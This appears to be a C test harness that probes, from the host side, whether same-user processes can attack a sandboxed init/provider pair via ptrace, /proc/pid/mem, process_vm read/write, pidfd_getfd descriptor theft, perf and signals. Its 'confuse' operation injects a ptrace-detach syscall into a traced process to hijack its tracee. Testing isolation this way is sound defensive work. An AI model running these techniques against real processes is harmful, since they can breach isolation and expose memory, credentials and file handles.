/* Host-side r7 hunts: same-uid attach, process_vm, pidfd, perf, signals.
 *
 * usage: host-attacks <op> <pid> [pid2]
 * ops: ptrace, mem, process_vm_read, process_vm_write, pidfd_getfd,
 *      proc_files, perf, kill, stop, core, dumpable_owner, confuse
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

static int alive(pid_t pid) {
    return kill(pid, 0) == 0 || errno == EPERM;
}

static void report(const char *op, int err) {
    if (err == 0) {
        printf("%s ok\n", op);
    } else {
        printf("%s errno=%d\n", op, err);
    }
}

static void op_ptrace(pid_t pid) {
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        report("ptrace_attach", errno);
        return;
    }
    int status = 0;
    waitpid(pid, &status, 0);
    report("ptrace_attach", 0);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

static void op_mem(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_RDWR);
    if (fd < 0) {
        report("open_mem", errno);
        return;
    }
    report("open_mem", 0);
    close(fd);
}

static void op_process_vm(pid_t pid, int write) {
    unsigned long addr = 0;
    char maps[64];
    snprintf(maps, sizeof(maps), "/proc/%d/maps", pid);
    FILE *f = fopen(maps, "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            addr = strtoul(line, NULL, 16);
        }
        fclose(f);
    }
    if (addr == 0) {
        addr = 0x400000;
    }
    char buf[8] = {0};
    struct iovec local = {.iov_base = buf, .iov_len = sizeof(buf)};
    struct iovec remote = {.iov_base = (void *)addr, .iov_len = sizeof(buf)};
    long ret;
    if (write) {
        ret = syscall(SYS_process_vm_writev, pid, &local, 1, &remote, 1, 0);
        report("process_vm_writev", ret < 0 ? errno : 0);
    } else {
        ret = syscall(SYS_process_vm_readv, pid, &local, 1, &remote, 1, 0);
        report("process_vm_readv", ret < 0 ? errno : 0);
        if (ret >= 0) {
            printf("process_vm_readv n=%ld\n", ret);
        }
    }
}

static void op_pidfd_getfd(pid_t pid) {
    int pfd = (int)syscall(SYS_pidfd_open, pid, 0);
    if (pfd < 0) {
        report("pidfd_open", errno);
        return;
    }
    report("pidfd_open", 0);
    int stolen = (int)syscall(SYS_pidfd_getfd, pfd, 1, 0);
    if (stolen < 0) {
        report("pidfd_getfd", errno);
    } else {
        report("pidfd_getfd", 0);
        close(stolen);
    }
    close(pfd);
}

static void try_one_proc(pid_t pid, const char *name) {
    char path[96];
    snprintf(path, sizeof(path), "/proc/%d/%s", pid, name);
    int flags = O_RDONLY;
    if (strcmp(name, "fd") == 0) {
        flags |= O_DIRECTORY;
    }
    int fd = open(path, flags);
    if (fd < 0) {
        printf("open_%s errno=%d\n", name, errno);
        return;
    }
    char buf[64];
    ssize_t n = read(fd, buf, sizeof(buf));
    if (n < 0) {
        printf("read_%s errno=%d\n", name, errno);
    } else {
        printf("read_%s ok n=%zd\n", name, n);
    }
    close(fd);
}

static void op_proc_files(pid_t pid) {
    try_one_proc(pid, "environ");
    try_one_proc(pid, "maps");
    try_one_proc(pid, "mem");
    try_one_proc(pid, "fd");
    try_one_proc(pid, "cmdline");
    try_one_proc(pid, "status");
}

static void op_perf(pid_t pid) {
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    attr.type = PERF_TYPE_SOFTWARE;
    attr.config = PERF_COUNT_SW_DUMMY;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    int fd = (int)syscall(SYS_perf_event_open, &attr, pid, -1, -1, 0);
    if (fd < 0) {
        report("perf_event_open", errno);
        return;
    }
    report("perf_event_open", 0);
    close(fd);
}

static void op_dumpable_owner(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_PATH);
    if (fd < 0) {
        /* O_PATH may still fail; fall back to stat via /proc. */
        snprintf(path, sizeof(path), "/proc/%d", pid);
    } else {
        close(fd);
    }
    snprintf(path, sizeof(path), "/proc/%d/status", pid);
    FILE *f = fopen(path, "r");
    if (!f) {
        printf("status errno=%d\n", errno);
        return;
    }
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "Uid:", 4) == 0 || strncmp(line, "Dumpable:", 9) == 0 ||
            strncmp(line, "State:", 6) == 0 || strncmp(line, "TracerPid:", 10) == 0) {
            fputs(line, stdout);
        }
    }
    fclose(f);
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    struct stat st;
    if (stat(path, &st) == 0) {
        printf("mem_uid=%u mem_mode=%o\n", st.st_uid, st.st_mode & 0777);
    } else {
        printf("mem_stat errno=%d\n", errno);
    }
}

static void op_kill(pid_t pid, int sig) {
    if (kill(pid, sig) < 0) {
        printf("kill_%d errno=%d\n", sig, errno);
    } else {
        printf("kill_%d ok\n", sig);
    }
}

/* Attach init, inject ptrace(PTRACE_DETACH, provider), then attach provider. */
static int inject_detach(pid_t init, pid_t provider) {
#if !defined(__x86_64__)
    (void)init;
    (void)provider;
    printf("confuse skip=not-x86_64\n");
    return 1;
#else
    if (ptrace(PTRACE_ATTACH, init, NULL, NULL) < 0) {
        report("confuse_attach_init", errno);
        return 1;
    }
    int status = 0;
    if (waitpid(init, &status, 0) < 0) {
        report("confuse_wait_init", errno);
        ptrace(PTRACE_DETACH, init, NULL, NULL);
        return 1;
    }
    report("confuse_attach_init", 0);

    struct user_regs_struct regs, saved;
    if (ptrace(PTRACE_GETREGS, init, NULL, &regs) < 0) {
        report("confuse_getregs", errno);
        ptrace(PTRACE_DETACH, init, NULL, NULL);
        return 1;
    }
    saved = regs;

    unsigned long rip = regs.rip;
    unsigned long orig = ptrace(PTRACE_PEEKTEXT, init, (void *)rip, NULL);
    /* syscall; int3  = 0xcc050f */
    unsigned long planted = (orig & ~0xffffffUL) | 0xcc050fUL;
    if (ptrace(PTRACE_POKETEXT, init, (void *)rip, (void *)planted) < 0) {
        report("confuse_poke", errno);
        ptrace(PTRACE_DETACH, init, NULL, NULL);
        return 1;
    }
    regs.rax = SYS_ptrace;
    regs.rdi = PTRACE_DETACH;
    regs.rsi = (unsigned long)provider;
    regs.rdx = 0;
    regs.r10 = 0;
    if (ptrace(PTRACE_SETREGS, init, NULL, &regs) < 0) {
        report("confuse_setregs", errno);
        ptrace(PTRACE_POKETEXT, init, (void *)rip, (void *)orig);
        ptrace(PTRACE_DETACH, init, NULL, NULL);
        return 1;
    }
    if (ptrace(PTRACE_CONT, init, NULL, NULL) < 0) {
        report("confuse_cont", errno);
        ptrace(PTRACE_POKETEXT, init, (void *)rip, (void *)orig);
        ptrace(PTRACE_DETACH, init, NULL, NULL);
        return 1;
    }
    if (waitpid(init, &status, 0) < 0) {
        report("confuse_wait_trap", errno);
    }
    struct user_regs_struct after;
    if (ptrace(PTRACE_GETREGS, init, NULL, &after) == 0) {
        printf("confuse_detach_rax=%lld\n", (long long)after.rax);
    }
    ptrace(PTRACE_POKETEXT, init, (void *)rip, (void *)orig);
    ptrace(PTRACE_SETREGS, init, NULL, &saved);
    ptrace(PTRACE_DETACH, init, NULL, NULL);

    usleep(20000);
    if (ptrace(PTRACE_ATTACH, provider, NULL, NULL) < 0) {
        report("confuse_attach_provider", errno);
        return 1;
    }
    waitpid(provider, &status, 0);
    report("confuse_attach_provider", 0);
    ptrace(PTRACE_DETACH, provider, NULL, NULL);
    return 0;
#endif
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: host-attacks op pid [pid2]\n");
        return 2;
    }
    const char *op = argv[1];
    pid_t pid = (pid_t)atoi(argv[2]);
    pid_t pid2 = argc >= 4 ? (pid_t)atoi(argv[3]) : 0;
    if (strcmp(op, "ptrace") == 0) {
        op_ptrace(pid);
    } else if (strcmp(op, "mem") == 0) {
        op_mem(pid);
    } else if (strcmp(op, "process_vm_read") == 0) {
        op_process_vm(pid, 0);
    } else if (strcmp(op, "process_vm_write") == 0) {
        op_process_vm(pid, 1);
    } else if (strcmp(op, "pidfd_getfd") == 0) {
        op_pidfd_getfd(pid);
    } else if (strcmp(op, "proc_files") == 0) {
        op_proc_files(pid);
    } else if (strcmp(op, "perf") == 0) {
        op_perf(pid);
    } else if (strcmp(op, "dumpable_owner") == 0) {
        op_dumpable_owner(pid);
    } else if (strcmp(op, "kill") == 0) {
        op_kill(pid, SIGKILL);
        usleep(50000);
        printf("still_alive=%d\n", alive(pid2 ? pid2 : pid));
        if (pid2) {
            printf("other_alive=%d\n", alive(pid2));
        }
    } else if (strcmp(op, "term") == 0) {
        op_kill(pid, SIGTERM);
        usleep(50000);
        printf("still_alive=%d\n", alive(pid));
        if (pid2) {
            printf("other_alive=%d\n", alive(pid2));
        }
    } else if (strcmp(op, "stop") == 0) {
        op_kill(pid, SIGSTOP);
        usleep(20000);
        printf("init_alive=%d\n", alive(pid));
        if (pid2) {
            printf("provider_alive=%d\n", alive(pid2));
            op_ptrace(pid2);
        }
        op_kill(pid, SIGCONT);
    } else if (strcmp(op, "core") == 0) {
        op_kill(pid, SIGQUIT);
        usleep(80000);
        printf("still_alive=%d\n", alive(pid));
    } else if (strcmp(op, "confuse") == 0) {
        if (!pid2) {
            fprintf(stderr, "confuse needs init and provider\n");
            return 2;
        }
        return inject_detach(pid, pid2);
    } else {
        fprintf(stderr, "unknown op %s\n", op);
        return 2;
    }
    return 0;
}
